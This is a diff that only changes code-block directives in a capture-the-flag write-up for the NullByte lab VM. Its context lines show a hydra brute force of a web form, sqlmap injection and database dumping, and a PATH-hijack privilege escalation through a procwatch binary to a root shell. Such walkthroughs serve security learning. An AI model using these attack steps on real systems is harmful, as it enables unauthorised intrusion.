@@ -18,7 +18,7 @@ Stage 1
 
 I ran the usual service discovery and found:
 
-.. code-block:: bash
+.. code:: bash
 
 	root@kali:~# nmap -sV 192.168.56.101
 	
@@ -47,7 +47,7 @@ The source of the page doesn't reveal anything else either, so that last place w
 is the image itself. There doesn't appear to be any steganography involved here and nothing in the hexdump of the image
 either. Well, let me take a look at the EXIF data then.
 
-.. code-block:: bash
+.. code:: bash
 
 	root@kali:~/Downloads# exiftool main.gif 
 	ExifTool Version Number         : 9.74
@@ -80,7 +80,7 @@ Stage 2
 Typing in something random just shows :code:`invalid key`. Ok, let me take a look at the source,
 see where this thing goes.
 
-.. code-block:: html
+.. code:: html
 
 	
 	<center>
@@ -94,7 +94,7 @@ see where this thing goes.
 Ok, so no SQLi here then, and the password isn't complex either. I'm guessing
 a simple wordlist might solve this for me. Time to break out :code:`hydra` for this:
 
-.. code-block:: bash
+.. code:: bash
 
 	root@kali:~# hydra 192.168.56.101 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l x -P /usr/share/dict/words -t 10 -w 30
 	Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
@@ -116,7 +116,7 @@ is the part that is backed by a SQL database. Although usernames and the usual
 SQLi synbols don't do much, entering nothing dumps multiple records. Maybe I will
 try to :code:`sqlmap` the URL to see if there's any vulnerabilities there
 
-.. code-block:: bash
+.. code:: bash
 
 	root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=
 	
@@ -133,7 +133,7 @@ try to :code:`sqlmap` the URL to see if there's any vulnerabilities there
 Result! Using this we can now dump the databasenames, tables, and data in the DB
 
 (output shortened for clarity)
-.. code-block:: bash
+.. code:: bash
 
 	root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=ramses --current-db
 	back-end DBMS: MySQL 5.0.12
@@ -171,7 +171,7 @@ port 777 on the VM. So I'll connect to that and have a look at what's going on t
 
 Not much in his home directory, so I'll checkout what he's been up to
 
-.. code-block:: bash
+.. code:: bash
 
 	ramses@NullByte:~$ cat .bash_history 
 	sudo -s
@@ -198,7 +198,7 @@ So let's see if it calls :code:`ps` with an absolute path, or not. As a quick te
 a symlink to :code:`ls` in the current directory and name it :code:`ps`. Then I set the :code:`PATH` environment variable
 with the current dir at the front.
 
-.. code-block:: bash
+.. code:: bash
 
 	ramses@NullByte:/var/www/backup$ ln -s /bin/ls ps
 	ramses@NullByte:/var/www/backup$ export PATH=`pwd`:${PATH}
@@ -210,7 +210,7 @@ find in programs that call other programs.
 
 So let me leverage this to get myself a root shell and ultimately the flag
 
-.. code-block:: bash
+.. code:: bash
 
 	ramses@NullByte:/var/www/backup$ ln -snf /bin/sh ps
 	ramses@NullByte:/var/www/backup$ ./procwatch 
